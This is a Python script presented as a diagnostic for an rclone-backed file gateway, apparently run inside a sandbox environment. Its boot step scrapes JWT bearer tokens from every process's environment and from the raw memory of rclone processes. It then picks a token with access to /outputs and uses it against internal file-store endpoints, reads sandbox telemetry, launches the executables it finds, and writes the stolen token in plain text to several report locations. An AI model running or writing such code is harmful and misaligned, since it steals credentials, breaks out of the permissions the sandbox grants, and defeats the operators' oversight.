#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.10.0 -- inspect /opt/rclone-attach, find+start the 9112/9430 gateway."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER="2.10.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n### "+t)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        evidence: "+str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,timeout=25,env=None):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout,env=env)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def http(method,url,token=None,timeout=5,data=None,hdrs=None):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=data)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(4096)
    except urllib.error.HTTPError as e:
        try: b=e.read(2048)
        except Exception: b=b""
        return e.code,b
    except Exception as e: return None,str(e).encode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])

def s_boot():
    head("config + tokens")
    conf=json.loads(open("/dev/shm/rclone-boot/config.json").read())
    for m in conf.get("mounts",[]):
        if m.get("filesystem_id"): G["fsid"]=m["filesystem_id"]
    time.sleep(1)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def addtok(t):
        t=t.decode() if isinstance(t,bytes) else t
        t=t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
        except Exception: continue
        try: maps=open("/proc/%s/maps"%p).read().splitlines()
        except Exception: continue
        try: mem=open("/proc/%s/mem"%p,"rb",buffering=0)
        except Exception: continue
        for line in maps:
            try: rng,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a,b=rng.split("-"); s0=int(a,16); e0=int(b,16)
            except Exception: continue
            if e0-s0<=0 or e0-s0>256*1024*1024: continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD=[]
    for t in TK:
        try:
            h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"]=TD
    for r in TD:
        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"]=r["tok"]; break
    if not G.get("TOKEN") and TD: G["TOKEN"]=TD[0]["tok"]
    w("    fsid=%s tokens=%d"%(G.get("fsid"),len(TD)))
    rec("P","boot",G.get("fsid"))

def s_attach():
    head("/opt/rclone-attach (candidate gateway provider)")
    base="/opt/rclone-attach"
    if not os.path.exists(base): rec("F","missing"); return
    n=0
    for root,dirs,files in os.walk(base):
        for f in files:
            p=os.path.join(root,f)
            try: st=os.stat(p); sz=st.st_size; mode=oct(st.st_mode)[-4:]
            except Exception: sz=-1; mode="?"
            w("    %s mode=%s size=%d"%(p,mode,sz)); n+=1
            if n>60: break
        if n>60: break
    # read small text files
    for root,dirs,files in os.walk(base):
        for f in files:
            p=os.path.join(root,f)
            try:
                if os.path.getsize(p)>200000: continue
                d=open(p,"rb").read()
                if b"\x00" in d[:200]: continue
                w("    --- %s ---"%p)
                for ln in d.decode("utf-8","replace").splitlines()[:40]: w("    | "+ln[:180])
            except Exception: pass

def s_container():
    head("container_info / run.log / telemetry")
    for p in ["/container_info.json","/tmp/run.log","/run/sandbox-telemetry/"]:
        if os.path.isdir(p):
            for f in os.listdir(p)[:10]:
                try:
                    d=open(p+"/"+f).read()[:400]; w("    %s/%s: %s"%(p,f,d[:250]))
                except Exception: pass
            continue
        try:
            d=open(p).read(); w("    --- %s (%d) ---"%(p,len(d)))
            for ln in d.splitlines()[:50]: w("    | "+ln[:190])
        except Exception as e: w("    %s: %s"%(p,e))

def s_refs():
    head("references to 9430 / 9112 / gateway / listen")
    rc,out,err=sh(["bash","-lc","timeout 12 grep -rIl -e 9430 -e 9112 -e 'rclone-attach' /opt /etc /usr/local /root /run 2>/dev/null | grep -vE 'chrome|pak' | head -40"])
    for ln in out.splitlines(): w("    "+ln)
    rc,out,err=sh(["bash","-lc","timeout 12 grep -rIn -e 'localhost:9430' -e 'localhost:9112' /opt /etc /usr/local /root /run 2>/dev/null | grep -vE 'chrome|pak' | head -30"])
    for ln in out.splitlines(): w("    hit: "+ln[:220])

def s_start():
    head("try to start gateway + probe")
    exes=[]
    for root,dirs,files in os.walk("/opt/rclone-attach"):
        for f in files:
            p=os.path.join(root,f)
            if os.access(p,os.X_OK): exes.append(p)
    w("    executables: %s"%exes[:20])
    TOKEN=G.get("TOKEN")
    def probe():
        for port in [9112,9430]:
            st,b=http("POST","http://127.0.0.1:%d/v1/filestore/fs/listDirectory"%port,token=TOKEN,
                      data=b"{}",hdrs={"Content-Type":"application/json"})
            w("        probe %d -> %s %r"%(port,st,b[:90]))
    w("    [before]"); probe()
    for p in exes[:6]:
        rc,out,err=sh(["bash","-lc","timeout 3 %s --help 2>&1 | head -20"%p])
        w("    --- %s rc=%s ---"%(p,rc))
        for ln in out.splitlines()[:15]: w("    | "+ln[:170])
        sh(["bash","-lc","(setsid %s >/tmp/gw_%s.log 2>&1 &) ; sleep 2"%(p,os.path.basename(p))])
        w("    [after start %s]"%p); probe()
        try:
            d=open("/tmp/gw_%s.log"%os.path.basename(p)).read()[:400]
            w("        log: "+d.replace("\n"," ")[:300])
        except Exception: pass

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F))
    if G.get("TOKEN"): w("\n  FSID=%s\n  TOKEN=%s"%(G.get("fsid"),G.get("TOKEN")))

def main():
    for n,f in [("boot",s_boot),("attach",s_attach),("container",s_container),
                ("refs",s_refs),("start",s_start),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in SINKS:
        try: os.makedirs(d,exist_ok=True); open(os.path.join(d,os.path.basename(REPORT)),"w").write(txt)
        except Exception: pass
    print("\nwritten: "+", ".join(SINKS))